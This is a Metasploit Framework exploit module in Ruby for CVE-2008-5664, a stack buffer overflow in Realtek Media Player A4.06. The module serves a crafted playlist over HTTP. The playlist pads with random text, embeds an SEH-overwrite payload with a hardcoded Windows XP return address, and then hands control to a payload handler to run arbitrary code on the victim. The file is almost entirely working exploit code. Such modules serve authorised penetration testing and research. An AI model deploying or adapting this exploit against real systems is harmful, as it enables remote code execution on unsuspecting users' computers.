##
# $Id: realtek_playlist.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Realtek Media Player Playlist Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Realtek Media Player(RtlRack) A4.06.
				When a Realtek Media Player client opens a specially crafted playlist, an
				attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'CVE', '2008-5664'],
					[ 'OSVDB', '50715'],
					[ 'BID', '32860' ],
				],
			'Payload'        =>
				{
					'Space'           => 550,
					'BadChars'	  => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Realtek Media Player(RtlRack) A4.06 (XP Pro All English)', { 'Ret' => 0x72d12899 } ], #  msacm32.drv 5.1.2600.0  (xpclient.010817-1148)
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 16 2008',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		return if ((p = regenerate_payload(cli)) == nil)

		pla =  rand_text_alpha_upper(200)
		pla << generate_seh_payload(target.ret)
		pla << rand_text_alpha_upper(1266)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, pla, { 'Content-Type' => 'text/plain' })

		handler(cli)

	end

end
